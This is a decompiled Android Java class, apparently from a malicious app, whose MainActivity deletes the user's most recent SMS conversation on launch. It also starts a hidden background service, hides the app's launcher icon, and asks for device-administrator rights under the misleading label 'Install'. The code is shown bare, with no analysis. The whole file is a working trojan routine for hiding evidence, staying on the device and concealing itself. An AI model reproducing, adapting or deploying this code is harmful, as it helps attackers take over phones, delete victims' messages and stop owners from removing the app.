// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.aizd.entry;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import com.admv.service.MainService;

// Referenced classes of package com.aizd.entry:
//            LSecScreen

public class MainActivity extends Activity
{

    public MainActivity()
    {
    }

    private long getThreadId()
    {
        long l;
        Cursor cursor;
        l = 0L;
        cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] {
            "_id", "thread_id", "address", "person", "date", "body"
        }, null, null, "date DESC");
        if(cursor == null)
            break MISSING_BLOCK_LABEL_107;
        int i = cursor.getCount();
        boolean flag = false;
        if(i > 0)
            flag = true;
        if(!flag)
            break MISSING_BLOCK_LABEL_101;
        long l1;
        cursor.moveToFirst();
        l1 = cursor.getLong(1);
        l = l1;
        cursor.close();
        return l;
        Exception exception;
        exception;
        cursor.close();
        throw exception;
    }

    private void startAddDeviceAdminAty()
    {
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", componentname);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Install");
        startActivity(intent);
    }

    protected void onCreate(Bundle bundle)
    {
        super.onCreate(bundle);
        requestWindowFeature(1);
        setContentView(0x7f030000);
        long l = getThreadId();
        Uri uri = Uri.parse((new StringBuilder("content://sms/conversations/")).append(l).toString());
        getContentResolver().delete(uri, null, null);
        startService(new Intent(this, com/admv/service/MainService));
        getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        admindpManager = (DevicePolicyManager)getSystemService("device_policy");
        componentname = new ComponentName(this, com/aizd/entry/LSecScreen);
        if(!admindpManager.isAdminActive(componentname))
            startAddDeviceAdminAty();
        finish();
    }

    private static DevicePolicyManager admindpManager;
    private ComponentName componentname;
}
